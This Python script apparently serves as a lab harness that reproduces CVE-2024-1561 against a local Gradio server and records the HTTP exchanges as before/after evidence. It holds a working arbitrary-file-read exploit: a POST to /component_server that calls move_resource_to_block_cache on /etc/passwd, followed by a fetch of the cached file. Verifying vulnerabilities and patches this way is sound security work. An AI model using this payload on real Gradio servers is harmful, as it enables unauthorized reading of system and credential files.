"""Collect local Gradio before/after HTTP evidence for CVE-2024-1561."""

import argparse
from datetime import datetime, timezone
import hashlib
import json
from pathlib import Path
from urllib.parse import quote, urlparse

import requests


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--base-url", default="http://127.0.0.1:7860")
    parser.add_argument("--output", required=True)
    parser.add_argument("--expect", choices=["vulnerable", "fixed"], required=True)
    args = parser.parse_args()
    if urlparse(args.base_url).hostname not in {"127.0.0.1", "localhost"}:
        parser.error("This lab script supports the local test environment only.")
    base = args.base_url.rstrip("/")
    output = Path(args.output)
    output.mkdir(parents=True, exist_ok=True)
    records = []

    def record(label, method, path, body=None):
        response = requests.request(method, base + path, json=body, timeout=30)
        records.append({"label": label, "method": method, "path": path,
                        "request_json": body, "status": response.status_code,
                        "response_headers": dict(response.headers), "body": response.text})
        print(f"{label}: {method} {path} -> HTTP {response.status_code}")
        return response

    config = record("component_configuration", "GET", "/config").json()
    component = next(c["id"] for c in config["components"] if c["type"] == "textbox")
    payload = {"component_id": component, "data": "/etc/passwd",
               "fn_name": "move_resource_to_block_cache", "session_hash": "lab1cheng"}
    normal = record("greeting_before", "POST", "/api/predict", {"data": ["Cheng Yang"], "fn_index": 0})
    direct = record("direct_file_access", "GET", "/file=/etc/passwd")
    malicious = record("arbitrary_method_call", "POST", "/component_server", payload)
    downloaded = None
    if malicious.status_code == 200:
        cached_file = malicious.json()
        downloaded = record("cached_file_read", "GET", "/file=" + quote(cached_file, safe="/"))
    regression = record("greeting_after", "POST", "/api/predict", {"data": ["Cheng Yang"], "fn_index": 0})
    assert direct.status_code == 403
    assert normal.status_code == regression.status_code == 200
    assert normal.json()["data"][0] == regression.json()["data"][0] == "Hello Cheng Yang!"
    if args.expect == "vulnerable":
        assert malicious.status_code == 200 and downloaded is not None
        assert downloaded.status_code == 200 and "root:x:0:0:" in downloaded.text
    else:
        assert malicious.status_code == 404
        assert malicious.json()["detail"] == "Function not found."
    result = {"timestamp_utc": datetime.now(timezone.utc).isoformat(),
              "base_url": base, "expect": args.expect, "gradio_version": config["version"],
              "component_id": component, "payload": payload, "records": records,
              "greeting_regression_passed": True,
              "file_sha256": hashlib.sha256(downloaded.content).hexdigest() if downloaded is not None else None}
    (output / "http-evidence.json").write_text(json.dumps(result, indent=2))
    transcript = []
    for item in records:
        if item["label"] == "component_configuration":
            body = json.dumps({"version": config["version"], "textbox_component_id": component})
        else:
            body = item["body"]
        transcript.append(f'{item["method"]} {base}{item["path"]}\n'
                          + (json.dumps(item["request_json"], indent=2) + "\n" if item["request_json"] else "")
                          + f'HTTP {item["status"]}\n{body}\n')
    (output / "transcript.txt").write_text("\n".join(transcript))
    print("All expected checks passed.")


if __name__ == "__main__":
    main()
